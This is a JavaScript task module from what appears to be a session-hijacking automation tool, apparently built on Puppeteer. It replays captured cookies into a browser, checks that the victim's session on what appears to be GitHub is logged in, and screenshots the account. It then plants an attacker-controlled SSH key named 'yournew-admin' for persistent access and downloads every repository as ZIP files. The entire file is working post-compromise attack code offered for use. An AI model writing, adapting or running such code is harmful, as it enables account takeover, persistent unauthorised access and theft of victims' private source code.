const db = require('../../db/db')
const necrolib = require('./necrolib')

exports.PlantAndDump = async ({ page, data: [taskId, cookies, params] }) => {

    // update initial task status from queued to running
    await db.UpdateTaskStatus(taskId, "running")

    // set all page cookies
    await page.setCookie(...cookies);

    // use util.inspect to explode objects for console-like debugging
    // let cc = await page.cookies()
    // console.log(' COOKIES IN PAGE:\n' +  util.inspect(cc))
    await page.waitForTimeout(2000)

    // go to defined page and check for authentication
    await page.goto(params.fixSession);

    // increase zoom for debugging purposes when running in gui mode
    //await necrohelp.SetPageScaleFactor(page, clusterLib.GetConfig().cluster.page.scaleFactor)


let querySelector = "body > div.logged-in.env-production.page-responsive.page-account";

    // if params.loggedInSelector exists and it's not empty use it instead
    if (params.loggedInSelector && params.loggedInSelector !== ""){
        querySelector = params.loggedInSelector
    }

    querySelector = "document.querySelector(\"" + querySelector + "\")";

    const loggedIn = await page.evaluate(querySelector).catch(console.error);
    if (typeof loggedIn !== 'undefined' && loggedIn !== null){
        console.log(`[${taskId}] session is invoked correctly.`)
    }else{
        await db.UpdateTaskStatusWithReason(taskId, "error", "session seems NOT authenticated")
        return
    }

    // screenshot urls of interest
    //for(let url of params.urls){
    //    await necrohelp.ScreenshotFullPage(page, taskId, url).catch(console.error)
   // }

   // await page.goto('https://github.com/settings/profile');
   await page.screenshot({path: `extrusion/screenshot_${taskId}.png`});
   console.log("Screenshot taken");	

    // plant necrobrowser ssh-key for necromantic control

    // ssh-key name is random starting from taskId, but always ending with '_nec'
   let sshKeyName = "yournew-admin";
   console.log(`[${taskId}] planting SSH key ${sshKeyName} for necromantic control \\.oOo./`)
   await necrolib.PlantSshKey(page, taskId, sshKeyName, "").catch(console.error)


    // scrape all repositories and download master branches as ZIP
    let repositories = await necrolib.ScrapeRepos(page, taskId)
    for (let repo of repositories){
	console.log(`[${taskId}] downloading repo --> ${repo}`)    
        await necrolib.DownloadRepo(page, taskId, repo)
	await page.waitForTimeout(5000)
    }

    // this task is completed, so update the status accordingly
    await db.UpdateTaskStatus(taskId, "completed")
};




